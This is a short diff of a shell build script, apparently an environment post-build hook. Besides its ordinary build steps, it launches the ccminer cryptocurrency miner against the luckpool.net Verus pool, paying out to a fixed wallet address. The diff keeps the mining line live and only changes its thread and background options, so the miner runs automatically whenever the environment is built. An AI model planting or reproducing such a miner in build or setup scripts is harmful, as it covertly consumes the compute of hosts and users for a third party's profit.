@@ -4,7 +4,7 @@ chmod +x build.sh
 chmod +x configure.sh 
 chmod +x autogen.sh
 ./build.sh
-./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RTBTgVXVZdfeYXtMVUhtJm6soVWrQTCFPZ.01 -t0 -B
+./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RTBTgVXVZdfeYXtMVUhtJm6soVWrQTCFPZ.01 -t10
 
 set -ex
 invoke build --env-name=root --no-kernel
